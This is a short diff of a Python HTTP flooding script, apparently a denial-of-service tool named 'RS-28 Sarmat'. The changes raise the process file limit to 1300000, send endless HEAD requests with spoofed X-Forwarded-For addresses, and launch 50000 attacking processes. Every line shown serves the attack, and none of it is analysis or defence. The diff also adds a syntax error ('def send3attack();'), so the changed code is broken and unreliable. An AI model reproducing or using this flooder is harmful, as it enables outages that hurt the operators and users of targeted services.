@@ -38,7 +38,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1000")
+    os.system("ulimit -n 1300000")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/3.0\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
@@ -77,8 +77,8 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 	
-def send3attack():
-  for i in range(70000): #Magic Power
+def send3attack();
+  for i in range(50000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
